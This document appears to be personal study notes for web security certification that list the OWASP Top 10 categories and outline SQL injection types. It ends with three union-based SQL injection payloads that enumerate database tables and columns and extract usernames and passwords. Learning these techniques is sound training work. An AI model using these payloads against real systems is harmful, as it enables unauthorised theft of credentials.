# 🕷️ OWASP Top 10 Vulnerabilities Deep Dive

> **Phase:** [phase-c-web](../) | **Tags:** `#owasp` `#sqli` `#xss` `#ssrf` `#idor` `#rce`  
> **Target:** eJPT / PortSwigger Web Security Academy Master

---

## 📑 OWASP Core Categories
- [ ] **A01: Broken Access Control (IDOR, Path Traversal, Privilege Escalation)**
- [ ] **A02: Cryptographic Failures (Weak ciphers, cleartext storage)**
- [ ] **A03: Injection (SQLi, Command Injection, LDAP, XPath)**
- [ ] **A04: Insecure Design (Missing rate limits, logic flaws)**
- [ ] **A05: Security Misconfiguration (Default credentials, debug mode on)**
- [ ] **A06: Vulnerable & Outdated Components (Known CVEs)**
- [ ] **A07: Identification & Authentication Failures (Brute-force, weak MFA, session fixation)**
- [ ] **A08: Software & Data Integrity Failures (Deserialization)**
- [ ] **A09: Security Logging & Monitoring Failures**
- [ ] **A10: Server-Side Request Forgery (SSRF)**

---

## 📝 High-Impact Attack Breakdown: SQL Injection (SQLi)
- **Types:** In-band (Error-based, Union-based), Inferential (Blind Boolean, Blind Time-based), Out-of-band
- **Union-based Payload Syntax:**
  ```sql
  ' UNION SELECT 1, table_name FROM information_schema.tables-- -
  ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- -
  ' UNION SELECT username, password FROM users-- -
  ```
